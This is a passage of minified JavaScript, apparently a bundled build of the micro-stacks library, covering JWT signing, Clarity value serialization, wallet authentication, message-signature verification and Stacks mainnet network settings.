              '"s" specified length of "' + a + '", max of "33" is acceptable'
            );
          let l = r;
          if (((r += a), r !== n))
            throw new Error(
              'Expected to consume entire buffer, but "' +
                (n - r) +
                '" bytes remain'
            );
          let c = 32 - o,
            u = 32 - a,
            f = new Uint8Array(c + o + u + a);
          for (r = 0; r < c; ++r) f[r] = 0;
          f.set(t.slice(s + Math.max(-c, 0), s + o), r), (r = 32);
          for (let h = r; r < h + u; ++r) f[r] = 0;
          return (
            f.set(t.slice(l + Math.max(-u, 0), l + a), r),
            M(f).replace(/=/g, "")
          );
        }
        function Hn(e, t, n) {
          let r = 0;
          for (; t + r < n && 0 === e[t + r]; ) ++r;
          return e[t + r] >= Rn && --r, r;
        }
        function Dn(e) {
          let t = Ln(e),
            n = 32,
            r = Hn(t, 0, n),
            i = Hn(t, n, t.length),
            o = n - r,
            s = n - i,
            a = 2 + o + 1 + 1 + s,
            l = a < Rn,
            c = new Uint8Array((l ? 2 : 3) + a),
            u = 0;
          return (
            (c[u++] = 48),
            l ? (c[u++] = a) : ((c[u++] = 1 | Rn), (c[u++] = 255 & a)),
            (c[u++] = 2),
            (c[u++] = o),
            r < 0
              ? ((c[u++] = 0), (u += K(t, c, u, 0, n)))
              : (u += K(t, c, u, r, n)),
            (c[u++] = 2),
            (c[u++] = s),
            i < 0 ? ((c[u++] = 0), K(t, c, u, n)) : K(t, c, u, n + i),
            M(c).replace(/=/g, "")
          );
        }
        function Mn(e, t) {
          let n = [],
            r = Nn.encode(JSON.stringify(t));
          n.push(r);
          let i = Nn.encode(JSON.stringify(e));
          return n.push(i), n.join(".");
        }
        var Fn = class {
            constructor() {
              let e = arguments.length > 1 ? arguments[1] : void 0;
              if (
                (a(this, "tokenType", void 0),
                a(this, "rawPrivateKey", void 0),
                !e)
              )
                throw new k(
                  "TokenSigner: rawPrivateKey is required to sign a token"
                );
              (this.tokenType = "JWT"), (this.rawPrivateKey = e);
            }
            header() {
              let e =
                arguments.length > 0 && void 0 !== arguments[0]
                  ? arguments[0]
                  : {};
              return { typ: this.tokenType, alg: "ES256K", ...e };
            }
            async sign(e) {
              let t =
                  arguments.length > 1 &&
                  void 0 !== arguments[1] &&
                  arguments[1],
                n =
                  arguments.length > 2 && void 0 !== arguments[2]
                    ? arguments[2]
                    : {},
                r = this.header(n),
                i = Mn(e, r),
                o = qt(h(i));
              return this.createWithSignedHash(e, t, r, i, o);
            }
            signSync(e) {
              let t =
                  arguments.length > 1 &&
                  void 0 !== arguments[1] &&
                  arguments[1],
                n =
                  arguments.length > 2 && void 0 !== arguments[2]
                    ? arguments[2]
                    : {},
                r = this.header(n),
                i = Mn(e, r),
                o = qt(h(i));
              return this.createWithSignedHashSync(e, t, r, i, o);
            }
            async createWithSignedHash(e, t, n, r, i) {
              let o = $n(await Ye(i, this.rawPrivateKey, { canonical: !1 }));
              return t
                ? {
                    header: [Nn.encode(JSON.stringify(n))],
                    payload: JSON.stringify(e),
                    signature: [o],
                  }
                : [r, o].join(".");
            }
            createWithSignedHashSync(e, t, n, r, i) {
              let o = (function (e, t) {
                  let n =
                    arguments.length > 2 && void 0 !== arguments[2]
                      ? arguments[2]
                      : {};
                  const { seed: r, m: i, d: o } = qe(e, t, n.extraEntropy);
                  let s;
                  const a = new Ne();
                  for (a.reseedSync(r); !(s = $e(a.generateSync(), i, o)); )
                    a.reseedSync();
                  return Ge(s, n);
                })(i, this.rawPrivateKey, { canonical: !1 }),
                s = $n(o);
              return t
                ? {
                    header: [Nn.encode(JSON.stringify(n))],
                    payload: JSON.stringify(e),
                    signature: [s],
                  }
                : [r, s].join(".");
            }
          },
          jn = class {
            constructor(e, t) {
              a(this, "tokenType", void 0),
                a(this, "rawPublicKey", void 0),
                (this.tokenType = "JWT"),
                (this.rawPublicKey = t);
            }
            verify(e) {
              let t =
                arguments.length > 1 && void 0 !== arguments[1] && arguments[1];
              return "string" == typeof e
                ? this.verifyCompact(e, t)
                : "object" == typeof e && this.verifyExpanded(e, t);
            }
            verifyCompact(e, t) {
              let n = e.split(".");
              return ((e) =>
                Je(g(U(Dn(n[2]))), g(e), this.rawPublicKey, { strict: t }))(
                qt(h(n[0] + "." + n[1]))
              );
            }
            verifyExpanded(e, t) {
              let n = [e.header.join("."), Nn.encode(e.payload)].join("."),
                r = !0;
              return ((n) => (
                e.signature.map((e) => {
                  Je(g(U(Dn(e))), g(n), this.rawPublicKey, { strict: t }) ||
                    (r = !1);
                }),
                r
              ))(qt(h(n)));
            }
          };
        function zn(e) {
          if ("string" == typeof e) {
            let t = e.split(".");
            return {
              header: JSON.parse(Nn.decode(t[0])),
              payload: JSON.parse(Nn.decode(t[1])),
              signature: t[2],
            };
          }
          if ("object" == typeof e) {
            if ("string" != typeof e.payload)
              throw new Error(
                "Expected token payload to be a base64 or json string"
              );
            let t = e.payload;
            "{" !== e.payload[0] && (t = Nn.decode(t));
            let n = [];
            return (
              e.header.map((e) => {
                let t = JSON.parse(Nn.decode(e));
                n.push(t);
              }),
              { header: n, payload: JSON.parse(t), signature: e.signature }
            );
          }
        }
        var Kn,
          Wn,
          Vn = BigInt("0xffffffffffffffffffffffffffffffff"),
          qn = BigInt(0),
          Gn =
            (BigInt("0x7fffffffffffffffffffffffffffffff"),
            BigInt("-170141183460469231731687303715884105728"),
            ((Wn = Gn || {})[(Wn.Origin = 1)] = "Origin"),
            (Wn[(Wn.Standard = 2)] = "Standard"),
            (Wn[(Wn.Contract = 3)] = "Contract"),
            Wn),
          Yn =
            (((Kn = Yn || {})[(Kn.Int = 0)] = "Int"),
            (Kn[(Kn.UInt = 1)] = "UInt"),
            (Kn[(Kn.Buffer = 2)] = "Buffer"),
            (Kn[(Kn.BoolTrue = 3)] = "BoolTrue"),
            (Kn[(Kn.BoolFalse = 4)] = "BoolFalse"),
            (Kn[(Kn.PrincipalStandard = 5)] = "PrincipalStandard"),
            (Kn[(Kn.PrincipalContract = 6)] = "PrincipalContract"),
            (Kn[(Kn.ResponseOk = 7)] = "ResponseOk"),
            (Kn[(Kn.ResponseErr = 8)] = "ResponseErr"),
            (Kn[(Kn.OptionalNone = 9)] = "OptionalNone"),
            (Kn[(Kn.OptionalSome = 10)] = "OptionalSome"),
            (Kn[(Kn.List = 11)] = "List"),
            (Kn[(Kn.Tuple = 12)] = "Tuple"),
            (Kn[(Kn.StringASCII = 13)] = "StringASCII"),
            (Kn[(Kn.StringUTF8 = 14)] = "StringUTF8"),
            Kn),
          Zn = (e) => {
            let t = x(e);
            if (t < qn)
              throw new RangeError(
                "Cannot construct unsigned clarity integer from negative value"
              );
            if (t > Vn)
              throw new RangeError(
                `Cannot construct unsigned clarity integer greater than ${Vn.toString()}`
              );
            return { type: 1, value: t };
          };
        function Jn(e) {
          return (
            /^[a-zA-Z]([a-zA-Z0-9]|[-_!?+<>=/*])*$|^[-+=/*]$|^[<>]=?$/.test(
              e
            ) && e.length < 128
          );
        }
        var Xn = ((e) => (
          (e[(e.Address = 0)] = "Address"),
          (e[(e.Principal = 1)] = "Principal"),
          (e[(e.LengthPrefixedString = 2)] = "LengthPrefixedString"),
          (e[(e.MemoString = 3)] = "MemoString"),
          (e[(e.AssetInfo = 4)] = "AssetInfo"),
          (e[(e.PostCondition = 5)] = "PostCondition"),
          (e[(e.PublicKey = 6)] = "PublicKey"),
          (e[(e.LengthPrefixedList = 7)] = "LengthPrefixedList"),
          (e[(e.Payload = 8)] = "Payload"),
          (e[(e.MessageSignature = 9)] = "MessageSignature"),
          (e[(e.TransactionAuthField = 10)] = "TransactionAuthField"),
          e
        ))(Xn || {});
        var Qn = (e, t) => !!e && h(e).length > t;
        function er(e, t, n) {
          let r = t || 1,
            i = n || 128;
          if (Qn(e, i))
            throw new Error(
              `String length exceeds maximum bytes ${i.toString()}`
            );
          return {
            type: 2,
            content: e,
            lengthPrefixBytes: r,
            maxLengthBytes: i,
          };
        }
        function tr(e) {
          let t = new W();
          return (
            t.appendHexString(w(e.version, 1)),
            t.appendHexString(e.hash160),
            t.concatBuffer()
          );
        }
        function nr(e) {
          let t = new W(),
            n = h(e.content),
            r = n.byteLength;
          return (
            t.appendHexString(w(r, e.lengthPrefixBytes)),
            t.push(n),
            t.concatBuffer()
          );
        }
        var rr = (e) => ({ type: 13, data: e });
        function ir(e) {
          for (let t in e)
            if (!Jn(t)) throw new Error(`"${t}" is not a valid Clarity name`);
          return { type: 12, data: e };
        }
        var or = ((e) => (
          (e[(e.ClarityAbiTypeUInt128 = 1)] = "ClarityAbiTypeUInt128"),
          (e[(e.ClarityAbiTypeInt128 = 2)] = "ClarityAbiTypeInt128"),
          (e[(e.ClarityAbiTypeBool = 3)] = "ClarityAbiTypeBool"),
          (e[(e.ClarityAbiTypePrincipal = 4)] = "ClarityAbiTypePrincipal"),
          (e[(e.ClarityAbiTypeNone = 5)] = "ClarityAbiTypeNone"),
          (e[(e.ClarityAbiTypeBuffer = 6)] = "ClarityAbiTypeBuffer"),
          (e[(e.ClarityAbiTypeResponse = 7)] = "ClarityAbiTypeResponse"),
          (e[(e.ClarityAbiTypeOptional = 8)] = "ClarityAbiTypeOptional"),
          (e[(e.ClarityAbiTypeTuple = 9)] = "ClarityAbiTypeTuple"),
          (e[(e.ClarityAbiTypeList = 10)] = "ClarityAbiTypeList"),
          (e[(e.ClarityAbiTypeStringAscii = 11)] = "ClarityAbiTypeStringAscii"),
          (e[(e.ClarityAbiTypeStringUtf8 = 12)] = "ClarityAbiTypeStringUtf8"),
          (e[(e.ClarityAbiTypeTraitReference = 13)] =
            "ClarityAbiTypeTraitReference"),
          e
        ))(or || {});
        function sr(e, t) {
          let n = new W(),
            r = Uint8Array.from([e]);
          return n.push(r), n.push(t), n.concatBuffer();
        }
        function ar(e) {
          let t = w(
              (function (e) {
                let t =
                  arguments.length > 1 && void 0 !== arguments[1]
                    ? arguments[1]
                    : 128;
                if (
                  e < -(S << (BigInt(t) - S)) ||
                  e > (S << (BigInt(t) - S)) - S
                )
                  throw `Integer out of range given ${t} bits to represent.`;
                return e >= E ? e : ~((-e - S) | ~((S << BigInt(t)) - S));
              })(e.value),
              16
            ),
            n = p(t);
          return sr(e.type, n);
        }
        function lr(e) {
          let t = [],
            n = new Uint8Array(4);
          new DataView(n.buffer, n.byteOffset, n.byteLength).setUint32(
            n.byteOffset,
            Object.keys(e.data).length
          ),
            t.push(n);
          let r = Object.keys(e.data).sort((e, t) =>
            (function (e, t) {
              if (!G(e, Uint8Array) || !G(t, Uint8Array))
                throw new TypeError(
                  'The "buf1", "buf2" arguments must be one of type Uint8Array'
                );
              if (e === t) return 0;
              let n = e.length,
                r = t.length;
              for (let i = 0, o = Math.min(n, r); i < o; ++i)
                if (e[i] !== t[i]) {
                  (n = e[i]), (r = t[i]);
                  break;
                }
              return n < r ? -1 : r < n ? 1 : 0;
            })(h(e), h(t))
          );
          for (let i of r) {
            let n = er(i);
            t.push(nr(n));
            let r = ur(e.data[i]);
            t.push(r);
          }
          return sr(e.type, u(t));
        }
        function cr(e, t) {
          let n = new W(),
            r = ("ascii" === t ? z : h)(e.data),
            i = new Uint8Array(4);
          return (
            new DataView(i.buffer, i.byteOffset, i.byteLength).setUint32(
              i.byteOffset,
              r.length
            ),
            n.push(i),
            n.push(r),
            sr(e.type, n.concatBuffer())
          );
        }
        function ur(e) {
          switch (e.type) {
            case 3:
            case 4:
              return (function (e) {
                return Uint8Array.from([e.type]);
              })(e);
            case 9:
            case 10:
              return (function (e) {
                return 9 === e.type
                  ? new Uint8Array([e.type])
                  : sr(e.type, ur(e.value));
              })(e);
            case 2:
              return (function (e) {
                let t = new Uint8Array(4);
                return (
                  new DataView(t.buffer, t.byteOffset, t.byteLength).setUint32(
                    t.byteOffset,
                    e.buffer.length
                  ),
                  sr(e.type, u([t, Uint8Array.from(e.buffer)]))
                );
              })(e);
            case 0:
              return ar(e);
            case 1:
              return (function (e) {
                let t = p(w(e.value, 16));
                return sr(e.type, t);
              })(e);
            case 5:
              return (function (e) {
                return sr(e.type, tr(e.address));
              })(e);
            case 6:
              return (function (e) {
                return sr(e.type, u([tr(e.address), nr(e.contractName)]));
              })(e);
            case 7:
            case 8:
              return (function (e) {
                return sr(e.type, ur(e.value));
              })(e);
            case 11:
              return (function (e) {
                let t = new W(),
                  n = new Uint8Array(4);
                (function (e, t, n) {
                  (t = +t),
                    (e[(n >>>= 0)] = t >>> 24),
                    (e[n + 1] = t >>> 16),
                    (e[n + 2] = t >>> 8),
                    (e[n + 3] = 255 & t);
                })(n, e.list.length, 0),
                  t.push(n);
                for (let r of e.list) {
                  let e = ur(r);
                  t.push(e);
                }
                return sr(e.type, t.concatBuffer());
              })(e);
            case 12:
              return lr(e);
            case 13:
              return (function (e) {
                return cr(e, "ascii");
              })(e);
            case 14:
              return (function (e) {
                return cr(e, "utf8");
              })(e);
            default:
              throw new Error("Unable to serialize. Invalid Clarity Value.");
          }
        }
        function fr(e) {
          return `0x${g(ur(e))}`;
        }
        var hr,
          dr =
            (((hr = dr || {})[(hr.OnChainOnly = 1)] = "OnChainOnly"),
            (hr[(hr.OffChainOnly = 2)] = "OffChainOnly"),
            (hr[(hr.Any = 3)] = "Any"),
            hr),
          pr =
            (J.Mainnet,
            ((e) => (
              (e[(e.Allow = 1)] = "Allow"), (e[(e.Deny = 2)] = "Deny"), e
            ))(pr || {})),
          gr = ((e) => (
            (e[(e.STX = 0)] = "STX"),
            (e[(e.Fungible = 1)] = "Fungible"),
            (e[(e.NonFungible = 2)] = "NonFungible"),
            e
          ))(gr || {}),
          yr = ((e) => (
            (e[(e.Standard = 4)] = "Standard"),
            (e[(e.Sponsored = 5)] = "Sponsored"),
            e
          ))(yr || {}),
          wr = ((e) => (
            (e[(e.SerializeP2PKH = 0)] = "SerializeP2PKH"),
            (e[(e.SerializeP2SH = 1)] = "SerializeP2SH"),
            (e[(e.SerializeP2WPKH = 2)] = "SerializeP2WPKH"),
            (e[(e.SerializeP2WSH = 3)] = "SerializeP2WSH"),
            e
          ))(wr || {}),
          mr = ((e) => (
            (e[(e.MainnetSingleSig = 22)] = "MainnetSingleSig"),
            (e[(e.MainnetMultiSig = 20)] = "MainnetMultiSig"),
            (e[(e.TestnetSingleSig = 26)] = "TestnetSingleSig"),
            (e[(e.TestnetMultiSig = 21)] = "TestnetMultiSig"),
            e
          ))(mr || {}),
          br = ((e) => (
            (e[(e.Compressed = 0)] = "Compressed"),
            (e[(e.Uncompressed = 1)] = "Uncompressed"),
            e
          ))(br || {}),
          vr = ((e) => (
            (e[(e.Equal = 1)] = "Equal"),
            (e[(e.Greater = 2)] = "Greater"),
            (e[(e.GreaterEqual = 3)] = "GreaterEqual"),
            (e[(e.Less = 4)] = "Less"),
            (e[(e.LessEqual = 5)] = "LessEqual"),
            e
          ))(vr || {}),
          Er = ((e) => (
            (e[(e.DoesNotOwn = 16)] = "DoesNotOwn"),
            (e[(e.Owns = 17)] = "Owns"),
            e
          ))(Er || {}),
          Sr = ((e) => (
            (e[(e.STX = 0)] = "STX"),
            (e[(e.Fungible = 1)] = "Fungible"),
            (e[(e.NonFungible = 2)] = "NonFungible"),
            e
          ))(Sr || {}),
          xr = ((e) => (
            (e.Serialization = "Serialization"),
            (e.Deserialization = "Deserialization"),
            (e.SignatureValidation = "SignatureValidation"),
            (e.FeeTooLow = "FeeTooLow"),
            (e.BadNonce = "BadNonce"),
            (e.NotEnoughFunds = "NotEnoughFunds"),
            (e.NoSuchContract = "NoSuchContract"),
            (e.NoSuchPublicFunction = "NoSuchPublicFunction"),
            (e.BadFunctionArgument = "BadFunctionArgument"),
            (e.ContractAlreadyExists = "ContractAlreadyExists"),
            (e.PoisonMicroblocksDoNotConflict =
              "PoisonMicroblocksDoNotConflict"),
            (e.PoisonMicroblockHasUnknownPubKeyHash =
              "PoisonMicroblockHasUnknownPubKeyHash"),
            (e.PoisonMicroblockIsInvalid = "PoisonMicroblockIsInvalid"),
            (e.BadAddressVersionByte = "BadAddressVersionByte"),
            (e.NoCoinbaseViaMempool = "NoCoinbaseViaMempool"),
            (e.ServerFailureNoSuchChainTip = "ServerFailureNoSuchChainTip"),
            (e.ServerFailureDatabase = "ServerFailureDatabase"),
            (e.ServerFailureOther = "ServerFailureOther"),
            e
          ))(xr || {});
        var Ar = ((e) => (
          (e[(e.TokenTransfer = 0)] = "TokenTransfer"),
          (e[(e.SmartContract = 1)] = "SmartContract"),
          (e[(e.ContractCall = 2)] = "ContractCall"),
          (e[(e.PoisonMicroblock = 3)] = "PoisonMicroblock"),
          (e[(e.Coinbase = 4)] = "Coinbase"),
          e
        ))(Ar || {});
        function kr(e) {
          let t = new W();
          return (
            t.appendByte(e.conditionType),
            t.push(Tr(e.principal)),
            (1 === e.conditionType || 2 === e.conditionType) &&
              t.push(Cr(e.assetInfo)),
            2 === e.conditionType && t.push(ur(e.assetName)),
            t.appendByte(e.conditionCode),
            (0 === e.conditionType || 1 === e.conditionType) &&
              t.push(
                (function (e) {
                  let t =
                    arguments.length > 2 && void 0 !== arguments[2]
                      ? arguments[2]
                      : 8;
                  return p(
                    w(
                      x(
                        e,
                        arguments.length > 1 &&
                          void 0 !== arguments[1] &&
                          arguments[1]
                      ),
                      t
                    )
                  );
                })(e.amount, !1, 8)
              ),
            t.concatBuffer()
          );
        }
        function Tr(e) {
          let t = new W();
          return (
            t.push(Uint8Array.from([e.prefix])),
            t.push(tr(e.address)),
            e.prefix === Gn.Contract && t.push(nr(e.contractName)),
            t.concatBuffer()
          );
        }
        function Cr(e) {
          let t = new W();
          return (
            t.push(tr(e.address)),
            t.push(nr(e.contractName)),
            t.push(nr(e.assetName)),
            t.concatBuffer()
          );
        }
        var Ir = ((e) => (
          (e[(e.PublicKeyCompressed = 0)] = "PublicKeyCompressed"),
          (e[(e.PublicKeyUncompressed = 1)] = "PublicKeyUncompressed"),
          (e[(e.SignatureCompressed = 2)] = "SignatureCompressed"),
          (e[(e.SignatureUncompressed = 3)] = "SignatureUncompressed"),
          e
        ))(Ir || {});
        var Or = typeof document < "u",
          Br = ((e) => (
            (e.SessionStorageKey = "stacks-session"),
            (e.NetworkStorageKey = "stacks-network"),
            e
          ))(Br || {}),
          Pr = c("localStorage", { returnEmptyObject: !0 }),
          _r = {
            setItem: (e, t) => {
              if (Or) return null == Pr ? void 0 : Pr.setItem(e, t);
            },
            getItem: (e) => {
              if (Or) {
                let t = null == Pr ? void 0 : Pr.getItem(e);
                if (null === t)
                  throw new Error("defaultStorageAdapter: no value stored");
                return t;
              }
            },
            removeItem: (e) => {
              if (Or) return null == Pr ? void 0 : Pr.removeItem(e);
            },
          },
          Ur = (e) => (e ? g(Fe(e, !0)) : null);
        function Nr(e) {
          return null == e
            ? void 0
            : e.map((e) => ("string" != typeof e ? g(kr(e)) : e));
        }
        var Rr = (e, t) =>
            t
              ? new Fn("ES256k", t).sign(e)
              : (function (e) {
                  return Mn(e, { typ: "JWT", alg: "none" }) + ".";
                })(e),
          Lr = async (e, t) => {
            let n = { ...e, postConditions: Nr(e.postConditions) };
            return Rr(n, t);
          },
          $r = ((e) => (
            (e.ContractCall = "contract_call"),
            (e.ContractDeploy = "smart_contract"),
            (e.STXTransfer = "token_transfer"),
            e
          ))($r || {});
        async function Hr(e) {
          let { functionArgs: t, privateKey: n, ...r } = e,
            i = Ur(n),
            o = {
              ...r,
              functionArgs: t.map((e) => v("string" == typeof e ? e : fr(e))),
              txType: "contract_call",
              publicKey: i,
            };
          return Lr(o, n);
        }
        async function Dr(e) {
          let { privateKey: t, ...n } = e,
            r = { ...n, publicKey: Ur(t), txType: "smart_contract" };
          return Lr(r, t);
        }
        async function Mr(e) {
          let { privateKey: t, ...n } = e,
            r = {
              ...n,
              amount:
                "bigint" == typeof n.amount
                  ? Number(n.amount).toString(10)
                  : n.amount,
              publicKey: Ur(t),
              txType: "token_transfer",
            };
          return Lr(r, t);
        }
        function Fr(e) {
          return e &&
            "btc-addr" ===
              (function (e) {
                let t = e.split(":");
                if (3 !== t.length)
                  throw new TypeError("Decentralized IDs must have 3 parts");
                if ("did" !== t[0].toLowerCase())
                  throw new TypeError(
                    'Decentralized IDs must start with "did"'
                  );
                return t[1].toLowerCase();
              })(e)
            ? e.split(":")[2]
            : void 0;
        }
        function jr() {
          return c("StacksProvider", {
            returnEmptyObject: !1,
            usageDesc: "authenticate",
            throwIfUnavailable: !0,
          });
        }
        async function zr(e) {
          let t =
              arguments.length > 1 && void 0 !== arguments[1]
                ? arguments[1]
                : _r,
            n =
              arguments.length > 2 && void 0 !== arguments[2]
                ? arguments[2]
                : JSON.stringify;
          var r, i;
          if (!e.appDetails)
            throw Error(
              "[micro-stacks] authenticate error: `authOptions.appDetails` are required for authentication"
            );
          try {
            let i = g(un()),
              o = await (async function (e, t) {
                let n = jr();
                if (!n)
                  throw Error(
                    "This function can only be called on the client, and with the presence of StacksProvider"
                  );
                let r = await (async function (e, t) {
                  let n = g(Fe(t)),
                    r = (function (e, t) {
                      if (!e.appDetails)
                        throw Error(
                          "[micro-stacks] authenticate error: `authOptions.appDetails` are required for authentication"
                        );
                      let n = e.scopes || [],
                        r = c("location", { returnEmptyObject: !0 }).origin;
                      return {
                        scopes: [...new Set(["store_write", ...n])],
                        redirect_uri: r,
                        public_keys: [t],
                        domain_name: r,
                        appDetails: e.appDetails,
                      };
                    })(e, n);
                  return (async function (e, t) {
                    return new Fn("ES256k", t).sign(e);
                  })(r, t);
                })(e, t);
                return n.authenticationRequest(r);
              })(e, i),
              s = await (async function (e, t) {
                let n,
                  r = zn(e),
                  i = null == r ? void 0 : r.payload;
                if (i.private_key)
                  try {
                    let e = m(i.private_key);
                    n = await Bn({ privateKey: t, cipherObject: e });
                  } catch {
                    console.error(
                      "[micro-stacks] failed to decrypt appPrivateKey"
                    );
                  }
                return {
                  addresses: i.profile.stxAddress,
                  appPrivateKey: n,
                  associationToken: i.associationToken,
                  hubUrl: i.hubUrl,
                  public_keys: i.public_keys,
                  profile: i.profile,
                  profile_url: i.profile_url,
                  username: i.username,
                  version: i.version,
                  decentralizedID: i.iss,
                  identityAddress: Fr(i.iss),
                };
              })(o, i);
            return (
              null == (r = null == e ? void 0 : e.onFinish) || r.call(e, s),
              t.setItem("stacks-session", n(s)),
              s
            );
          } catch (hn) {
            null == (i = null == e ? void 0 : e.onCancel) ||
              i.call(e, hn.message);
          }
        }
        function Kr(e) {
          return async function (t) {
            let { token: n, onFinish: r, onCancel: i } = t;
            try {
              let t = jr();
              if (!t)
                throw new Error("[micro-stacks/connect] No Stacks provider");
              let i = t[e];
              if ("function" != typeof i)
                throw new Error(
                  `[micro-stacks/connect] StacksProvider method ${e} not found`
                );
              let o = await i(n);
              null == r || r(o);
            } catch (Gt) {
              null == i || i(null == Gt ? void 0 : Gt.message);
            }
          };
        }
        var Wr = Kr("transactionRequest"),
          Vr = Kr("signatureRequest"),
          qr = Kr("structuredDataSignatureRequest"),
          Gr = Kr("psbtRequest"),
          Yr = ((e) => (
            (e.Chrome =
              "https://chrome.google.com/webstore/detail/hiro-wallet/ldinpeekobnhjjdofggfgjlcehhmanlj"),
            (e.Firefox =
              "https://addons.mozilla.org/en-US/firefox/addon/hiro-wallet/"),
            (e.Mobile = "https://www.xverse.app"),
            (e.Browser = "https://www.hiro.so/wallet/install-web"),
            e
          ))(Yr || {});
        var Zr = async (e) => {
            try {
              let t = await (async (e) => {
                let t = {
                  stxAddress: e.stxAddress || null,
                  message: e.message,
                  appDetails: e.appDetails || null,
                  publicKey: Ur(e.privateKey),
                  network: e.network,
                };
                return Rr(t, e.privateKey);
              })({
                message: e.message,
                network: e.network,
                privateKey: e.privateKey,
                stxAddress: e.stxAddress,
                authOrigin: e.authOrigin,
                appDetails: e.appDetails,
              });
              return Vr({
                token: t,
                onFinish: e.onFinish,
                onCancel: e.onCancel,
              });
            } catch (t) {
              console.error("[micro-stacks] handleSignMessageRequest failed"),
                console.error(t);
            }
          },
          Jr =
            (Uint8Array.from([83, 73, 80, 48, 49, 56]),
            (e, t, n) =>
              ir({ name: rr(e), version: rr(t), "chain-id": Zn(n) })),
          Xr = async (e) => {
            try {
              let t = await ((e) => {
                var t, n, r;
                let i =
                    "string" != typeof e.message ? fr(e.message) : e.message,
                  o = fr(
                    Jr(
                      e.domain.name,
                      e.domain.version,
                      null !==
                        (t =
                          null !== (n = e.domain.chainId) && void 0 !== n
                            ? n
                            : null == (r = e.network)
                            ? void 0
                            : r.chainId) && void 0 !== t
                        ? t
                        : Z.Mainnet
                    )
                  ),
                  s = {
                    stxAddress: e.stxAddress || null,
                    message: v(i),
                    domain: v(o),
                    appDetails: e.appDetails,
                    publicKey: Ur(e.privateKey),
                    network: e.network,
                  };
                return Rr(s, null == e ? void 0 : e.privateKey);
              })({
                message: e.message,
                domain: e.domain,
                privateKey: e.privateKey,
                stxAddress: e.stxAddress,
                authOrigin: e.authOrigin,
                appDetails: e.appDetails,
                network: e.network,
              });
              return qr({
                token: t,
                onFinish: e.onFinish,
                onCancel: e.onCancel,
              });
            } catch (t) {
              console.error(
                "[micro-stacks] handleSignStructuredDataRequest failed"
              ),
                console.error(t);
            }
          },
          Qr = 9007199254740991;
        function ei(e) {
          if (e < 0 || e > Qr || e % 1 !== 0)
            throw new RangeError("value out of range");
        }
        var ti = (e, t, n) => {
          let r;
          if ((ei(e), t || (t = new Uint8Array(ni(e))), !f(t)))
            throw new TypeError("uint8Array must be of Uint8Array type");
          return (
            n || (n = 0),
            e < 253
              ? (V(t, e, n), (r = 1))
              : e <= 65535
              ? (V(t, 253, n),
                (function (e, t, n) {
                  (t = +t), (e[(n >>>= 0)] = 255 & t), (e[n + 1] = t >>> 8);
                })(t, e, n + 1),
                (r = 3))
              : e <= 4294967295
              ? (V(t, 254, n), q(t, e, n + 1), (r = 5))
              : (V(t, 255, n),
                q(t, e >>> 0, n + 1),
                q(t, (e / 4294967296) | 0, n + 5),
                (r = 9)),
            (ti.bytes = r),
            t
          );
        };
        function ni(e) {
          return ei(e), e < 253 ? 1 : e <= 65535 ? 3 : e <= 4294967295 ? 5 : 9;
        }
        var ri = at("\x17Stacks Signed Message:\n"),
          ii = at("\x18Stacks Message Signing:\n");
        function oi(e) {
          return qt(
            (function (e) {
              let t =
                  arguments.length > 1 && void 0 !== arguments[1]
                    ? arguments[1]
                    : ri,
                n = "string" == typeof e ? at(e) : e,
                r = ti(n.length);
              return u([t, r, n]);
            })(
              e,
              arguments.length > 1 && void 0 !== arguments[1]
                ? arguments[1]
                : ri
            )
          );
        }
        var si = (e) => {
            let { hash: t, signature: n, recoveryBytes: r } = e;
            return (function (e, t, n) {
              let r =
                arguments.length > 3 && void 0 !== arguments[3] && arguments[3];
              return fe.fromSignature(e, t, n).toRawBytes(r);
            })(t, n, Number(r), !0);
          },
          ai = (e) => {
            let { signature: t, mode: n = "rsv" } = e,
              {
                r: r,
                s: i,
                recoveryBytes: o,
              } = (function (e) {
                if (e.length < 129) throw new Error("Invalid signature");
                let t = e.slice(0, 2),
                  n = e.slice(2, 66),
                  r = e.slice(66);
                return { recoveryBytes: y(t), r: n, s: r };
              })(
                "rsv" === n
                  ? (function (e) {
                      return e.slice(-2) + e.slice(0, -2);
                    })(t)
                  : t
              );
            return { signature: new pe(y(r), y(i)), recoveryBytes: o };
          },
          li = (e) => {
            if (!e.publicKey && !e.stxAddress)
              throw Error(
                "[micro-stacks/connect[ verifyMessageSignature -- You must pass `stxAddress` if you are recovering the public key from the signature"
              );
            let { message: t, mode: n = "rsv" } = e,
              r = e.publicKey;
            try {
              let i = "string" == typeof t ? oi(t, e.prefix) : t,
                { signature: o, recoveryBytes: s } = ai({
                  signature: e.signature,
                  mode: n,
                });
              if (!r) {
                let [t] = En(e.stxAddress);
                r = g(si({ hash: i, signature: o, recoveryBytes: s }));
                let n = An(r, t);
                if (n !== e.stxAddress)
                  return (
                    console.error(
                      `[micro-stacks/connect] verifyMessageSignature Stacks address is not correct. expected: ${e.stxAddress}, received: ${n}`
                    ),
                    !1
                  );
              }
              return Je(o, i, r, { strict: !1 });
            } catch (Zt) {
              return (
                console.error(
                  "[micro-stacks/connect] verifyMessageSignature failed",
                  Zt
                ),
                !1
              );
            }
          },
          ci = async (e) => {
            try {
              let t = await (async (e) => {
                let t = {
                  allowedSighash: e.allowedSighash || null,
                  hex: e.hex || null,
                  signAtIndex: e.signAtIndex || null,
                  stxAddress: e.stxAddress || null,
                  appDetails: e.appDetails || null,
                  publicKey: Ur(e.privateKey),
                  network: e.network,
                };
                return Rr(t, e.privateKey);
              })({
                allowedSighash: e.allowedSighash,
                hex: e.hex,
                signAtIndex: e.signAtIndex,
                privateKey: e.privateKey,
                stxAddress: e.stxAddress,
                authOrigin: e.authOrigin,
                appDetails: e.appDetails,
              });
              return Gr({
                token: t,
                onFinish: e.onFinish,
                onCancel: e.onCancel,
              });
            } catch (t) {
              console.error("[micro-stacks] handlePSBTRequest failed"),
                console.error(t);
            }
          },
          ui = class {
            get coreApiUrl() {
              return this._coreApiUrl;
            }
            set coreApiUrl(e) {
              throw new Error(
                "Cannot modify property `coreApiUrl` after object initialization"
              );
            }
            constructor() {
              let e =
                arguments.length > 0 && void 0 !== arguments[0]
                  ? arguments[0]
                  : { url: "https://stacks-node-api.mainnet.stacks.co" };
              if (
                (a(this, "version", J.Mainnet),
                a(this, "chainId", Z.Mainnet),
                a(this, "broadcastEndpoint", "/v2/transactions"),
                a(this, "transferFeeEstimateEndpoint", "/v2/fees/transfer"),
                a(this, "accountEndpoint", "/v2/accounts"),
                a(this, "contractAbiEndpoint", "/v2/contracts/interface"),
                a(
                  this,
                  "readOnlyFunctionCallEndpoint",
                  "/v2/contracts/call-read"
                ),
                a(this, "bnsLookupUrl", void 0),
                a(this, "_coreApiUrl", void 0),
